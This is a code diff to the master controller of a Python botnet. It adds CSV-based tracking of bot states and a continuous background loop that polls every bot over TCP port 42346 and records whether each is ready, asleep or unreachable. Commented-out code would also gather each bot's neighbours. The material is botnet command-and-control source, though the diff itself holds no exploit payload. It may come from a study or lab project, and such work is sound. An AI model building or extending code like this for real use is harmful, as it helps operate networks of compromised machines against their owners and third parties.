@@ -3,6 +3,8 @@ from cryptography.hazmat.primitives.asymmetric import rsa
 import socket
 import sys
 import random
+import pandas as pd
+import time
 
 class Master:
 
@@ -124,6 +126,7 @@ class Master:
 
     def update(self):
         print("Updating Botnet Status")
+        df = pd.read_csv("./bots.csv")
         for host in self.bootstrap_list.keys():
             try:
                 with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
@@ -132,16 +135,70 @@ class Master:
                     response = s.recv(1024)
                     if response.decode() == 'False':
                         self.bootstrap_list[host] = 1
+                        df.loc[df['ip_addr']==host, ['state']] = 'Ready'
                     elif response.decode() == 'True':
                         self.bootstrap_list[host] = 0
+                        df.loc[df['ip_addr']==host, ['state']] = 'Asleep'
                     s.close()
             except socket.error or ConnectionRefusedError or ConnectionError as e:
                 print("Error reaching out to host {}".format(host))
                 print(e)
                 self.bootstrap_list[host] = -1
+                df.loc[df['ip_addr']==host, ['state']] = 'Unreachable'
                 pass
+        df.to_csv("./bots.csv", index=False)
         print("Done Updating")
 
+    def update_background(self):
+        back_port = 42346
+        while True:
+            try:
+                df = pd.read_csv("./bots.csv")
+                for host in self.bootstrap_list.keys():
+                    try:
+                        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                            s.connect((host, back_port))
+                            s.sendall("Update Request".encode())
+                            response = s.recv(1024)
+                            if response.decode() == 'False':
+                                self.bootstrap_list[host] = 1
+                                df.loc[df['ip_addr']==host, ['state']] = 'Ready'
+                            elif response.decode() == 'True':
+                                self.bootstrap_list[host] = 0
+                                df.loc[df['ip_addr']==host, ['state']] = 'Asleep'
+                            
+                            #s.sendall("Show Neighbors".encode())
+                            #response2 = s.recv(1024)
+                            #print (response2.decode().split(' '))
+                            #neighbors = response2.decode().split(' ')
+                            s.close()
+                    except socket.error or ConnectionRefusedError or ConnectionError as e:
+                        self.bootstrap_list[host] = -1
+                        df.loc[df['ip_addr']==host, ['state']] = 'Unreachable'
+                        pass
+                     
+                    #cmd = "Show Neighbors"
+                     
+                    #try:
+                    #    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                    #        s.connect((host, self.port))
+                    #        s.sendall(cmd.encode())
+                    #        response = s.recv(1024)
+                    #        s.close()
+                    #        print (response.decode().split(' '))
+                    #        neighbors =  response.decode().split(' ')
+                    #except socket.error or ConnectionRefusedError or ConnectionError as e:
+                    #    print("Error reaching out to host {}".format(host))
+                    #    print(e)
+                    #    pass
+                    #neighbors = self.show_neighbors(host)
+                    #print (neighbors)
+                    #df.loc[df['ip_addr']==host, ['neighbors']] = str(neighbors)
+                df.to_csv("./bots.csv", index=False)
+                time.sleep(2)
+            except FileNotFoundError:
+                pass
+    
     @staticmethod
     def __gen_random():
         return random.randint(0, sys.maxsize)
